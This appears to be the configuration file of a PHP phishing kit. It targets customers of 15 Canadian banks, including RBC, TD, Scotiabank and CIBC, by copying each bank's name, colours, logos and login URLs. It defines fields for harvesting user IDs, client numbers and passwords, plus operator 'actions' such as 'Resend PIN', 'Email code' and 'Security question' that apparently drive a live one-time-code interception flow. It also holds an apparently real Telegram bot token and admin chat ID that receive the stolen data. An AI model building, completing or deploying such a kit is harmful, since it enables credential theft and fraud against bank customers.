<?php
/**
 * config.php - Configuration for the login redirect-and-loader system.
 * It includes Telegram bot credentials and bank-specific settings.
 */

// Telegram Bot API credentials (replace with your actual bot token and admin chat ID)
$BOT_TOKEN     = '6278639566:AAFOIuW6Gjd53XTJJSQUoWu83j9bQ540Th8';    // e.g., 123456789:ABCDefGhIjKlMnOpQrStUvWxYz
$ADMIN_CHAT_ID = '-1002651242191';      // Chat ID (or channel ID) where admin notifications are sent


// Default actions if a bank doesn't define its own.
$DEFAULT_ACTIONS = [
    'Correct password',
    'Incorrect password',
    'Resend PIN',
    'Email code',
    'Incorrect security code',
    'Timeout',
    'Deposit success'
];

// Default login fields if a bank doesn't define its own.
$DEFAULT_FIELDS = [
    [
        'name'        => 'user_id',
        'label'       => 'User ID',
        'type'        => 'text',
        'placeholder' => 'Enter your User ID'
    ],
    [
        'name'        => 'password',
        'label'       => 'Password',
        'type'        => 'password',
        'placeholder' => 'Enter your Password'
    ]
];

// Configuration array for each supported bank.
$BANKS = [
    // 1. Royal Bank of Canada (RBC)
    'rbc' => [
        'name'          => 'Royal Bank of Canada (RBC)',
        'color'         => '#005DAA',
        'redirect_base' => 'rbcroyalbank.com',
        'login_url'     => 'https://secure.royalbank.com',
        'logo_url'      => 'https://www.rbc.com/dvl/v1.0/assets/images/logos/rbc-logo-shield-blue.svg',
        'actions'       => [
            'Correct password',
            'Incorrect password',
            'Security question',
            'Swipe to approve',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout'
        ],
        'fields' => [
            [
                'name'        => 'user_id',
                'label'       => 'RBC User ID',
                'type'        => 'text',
                'placeholder' => 'Enter your RBC User ID'
            ],
            [
                'name'        => 'password',
                'label'       => 'Password',
                'type'        => 'password',
                'placeholder' => 'Enter your Password'
            ]
        ]
    ],
    // 2. TD Canada Trust (TD)
    'td' => [
        'name'          => 'TD Canada Trust (TD)',
        'color'         => '#54B848',
        'redirect_base' => 'td.com',
        'login_url'     => 'https://easyweb.td.com',
        'logo_url'      => 'https://www.td.com/content/dam/tdct/images/personal-banking/td-logo-en.png',
        'actions'       => [
            'Correct password',
            'Incorrect password',
            'Security question',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
        ],
        'fields' => [
            [
                'name'        => 'client_number',
                'label'       => 'Client Number',
                'type'        => 'text',
                'placeholder' => 'Enter your Client Number'
            ],
            [
                'name'        => 'password',
                'label'       => 'Password',
                'type'        => 'password',
                'placeholder' => 'Enter your Password'
            ]
        ]
    ],
    // 3. Scotiabank
    'scotiabank' => [
        'name'          => 'Scotiabank',
        'color'         => '#D81F26',
        'redirect_base' => 'scotiabank.com',
        'login_url'     => 'https://www.scotiaonline.scotiabank.com',
        'logo_url'      => 'https://upload.wikimedia.org/wikipedia/commons/2/2c/Scotiabank-logo-red.png',
        'actions'       => [
            'Correct password',
            'Incorrect password',
            'Security question',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
        ]
        // Uses default fields.
    ],
    // 4. CIBC
    'cibc' => [
        'name'          => 'Canadian Imperial Bank of Commerce (CIBC)',
        'color'         => '#B00B1C',
        'redirect_base' => 'cibc.com',
        'login_url'     => 'https://www.cibconline.cibc.com/ebm-resources/online-banking/client/index.html#/auth/signon',
        'logo_url'      => 'https://online.cibc.com/EAIEEEWeb/img/CILogo.png',
        'actions'       => [
            'Correct password',
            'Incorrect password',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
        ]
    ],
    // 5. Bank of Montreal (BMO)
    'bmo' => [
        'name'          => 'Bank of Montreal (BMO)',
        'color'         => '#0079C1',
        'redirect_base' => 'bmo.com',
        'login_url'     => 'https://m2.bmo.com',
        'logo_url'      => 'https://www.bmo.com/dist/images/logos/bank-of-montreal/bmo-blue-rev-pride.svg',
        'actions'       => [
            'Correct password',
            'Incorrect password',
            'Security question',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
        ]
    ],
    // 6. National Bank of Canada (NBC)
    'nbc' => [
        'name'          => 'National Bank of Canada',
        'color'         => '#ED1C24',
        'redirect_base' => 'nbc.ca',
        'login_url'     => 'https://app.bnc.ca',
        'logo_url'      => 'https://upload.wikimedia.org/wikipedia/commons/e/e5/National_Bank_Of_Canada.svg',
        'actions'       => [
            'Correct password',
            'Incorrect password',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
        ]
    ],
    // 7. Tangerine
    'tangerine' => [
        'name'          => 'Tangerine',
        'color'         => '#F28500',
        'redirect_base' => 'tangerine.ca',
        'login_url'     => 'https://www.tangerine.ca/app/#/login',
        'logo_url'      => 'https://www.tangerine.ca/static_files/Tangerine/WebAssets/images/en/tangerine_lockup_en.svg',
        'actions'       => [
            'Correct password',
            'Incorrect password',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
        ]
    ],
    // 8. Simplii Financial
    'simplii' => [
        'name'          => 'Simplii Financial',
        'color'         => '#D30D85',
        'redirect_base' => 'simplii.com',
        'login_url'     => 'https://online.simplii.com/',
        'logo_url'      => 'https://online.simplii.com/ebm-resources/public/content/web/common/img/logo.png',
        'actions'       => [
            'Correct password',
            'Incorrect password',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
        ]
    ],
    // 9. ATB (Alberta Treasury Branches)
    'atb' => [
        'name'          => 'ATB Financial',
        'color'         => '#003087',  // ATB blue (example)
        'redirect_base' => 'atb.com',
        'login_url'     => 'https://www.atb.com',
        'logo_url'      => 'https://www.atb.com/globalassets/atb-logo.svg',  // Example URL; update if needed
        'actions'       => $DEFAULT_ACTIONS,
        'fields'        => $DEFAULT_FIELDS
    ],
    // 10. Desjardins
    'desjardins' => [
        'name'          => 'Desjardins',
        'color'         => '#E2231A',
        'redirect_base' => 'desjardins.com',
        'login_url'     => 'https://www.desjardins.com/ca/',
        'logo_url'      => 'https://www.desjardins.com/etc/designs/desjardins/global/images/desjardins-logo.svg',
        'actions'       => $DEFAULT_ACTIONS,
        'fields'        => $DEFAULT_FIELDS
    ],
    // 11. PC Financial
    'pcfinancial' => [
        'name'          => 'PC Financial',
        'color'         => '#009EE3',
        'redirect_base' => 'pcfinancial.ca',
        'login_url'     => 'https://www.pcfinancial.ca',
        'logo_url'      => 'https://www.pcfinancial.ca/content/dam/pcfinancial/common/logo/pcfinancial-logo.svg',
        'actions'       => $DEFAULT_ACTIONS,
        'fields'        => $DEFAULT_FIELDS
    ],
    // 12. Coast Capital
    'coastcapital' => [
        'name'          => 'Coast Capital Savings',
        'color'         => '#005288',
        'redirect_base' => 'coastcapital.com',
        'login_url'     => 'https://www.coastcapitalsavings.com',
        'logo_url'      => 'https://www.coastcapitalsavings.com/wp-content/uploads/2018/02/CCLogo.svg',
        'actions'       => $DEFAULT_ACTIONS,
        'fields'        => $DEFAULT_FIELDS
    ],
    // 13. Motusbank
    'motusbank' => [
        'name'          => 'Motusbank',
        'color'         => '#FF6600',
        'redirect_base' => 'motusbank.ca',
        'login_url'     => 'https://www.motusbank.ca',
        'logo_url'      => 'https://www.motusbank.ca/content/dam/motusbank/brand/motusbank-logo.svg',
        'actions'       => $DEFAULT_ACTIONS,
        'fields'        => $DEFAULT_FIELDS
    ],
    // 14. Meridian
    'meridian' => [
        'name'          => 'Meridian Credit Union',
        'color'         => '#008B8B',
        'redirect_base' => 'meridiancu.ca',
        'login_url'     => 'https://www.meridiancu.ca',
        'logo_url'      => 'https://www.meridiancu.ca/wp-content/uploads/2020/06/meridian-logo.svg',
        'actions'       => $DEFAULT_ACTIONS,
        'fields'        => $DEFAULT_FIELDS
    ],
    // 15. Manulife Bank
    'manulife' => [
        'name'          => 'Manulife Bank',
        'color'         => '#0055A4',
        'redirect_base' => 'manulifebank.ca',
        'login_url'     => 'https://online.manulifebank.ca',
        'logo_url'      => 'https://www.manulifebank.ca/content/dam/manulife/images/logos/manulife-logo.svg',
        'actions'       => $DEFAULT_ACTIONS,
        'fields'        => $DEFAULT_FIELDS
    ]
];

// Ensure each bank has default actions and fields if not defined.
foreach ($BANKS as $code => &$config) {
    if (!isset($config['actions']) || !is_array($config['actions'])) {
        $config['actions'] = $DEFAULT_ACTIONS;
    }
    if (!isset($config['fields']) || !is_array($config['fields'])) {
        $config['fields'] = $DEFAULT_FIELDS;
    }
}
unset($config);
?>